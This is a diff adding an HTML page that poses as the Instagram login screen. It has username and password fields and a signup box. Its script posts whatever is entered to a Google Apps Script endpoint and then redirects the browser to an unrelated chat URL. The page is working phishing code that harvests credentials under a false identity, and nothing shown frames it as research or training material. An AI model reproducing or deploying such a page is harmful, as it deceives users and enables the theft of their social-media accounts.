@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 320px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 50px; /* Adjust the width as needed */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background-color: #3897f0;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .signup-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 320px;
+            text-align: center;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .signup-box p {
+            margin: 0;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="download.jpg" alt="Instagram Logo" class="logo">
+            <form name="submit-to-google-sheet">
+                <input type="text" name="id" placeholder="Username" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <p>Forgot your password? <a href="#">Reset it here</a></p>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+    
+    <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw-vha_j7Ubx7OnzrzCwaWVgo_Uq6ITOWGitOAo5LPNpTsV52YwTEdra5CjH5KzGVjt/exec';
+    const form = document.forms['submit-to-google-sheet'];
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                console.log('Success!', response);
+                // Redirect to another page after successful form submission
+                window.location.href = 'https://chat.openai.com/c/e35bfe39-a105-4c2b-88b5-6af7726e5fe3'; // Change 'another-page.html' to the desired page URL
+            })
+            .catch(error => console.error('Error!', error.message));
+    });
+</script>
+
+    
+    
+    
+    
+    
+</body>
+</html>
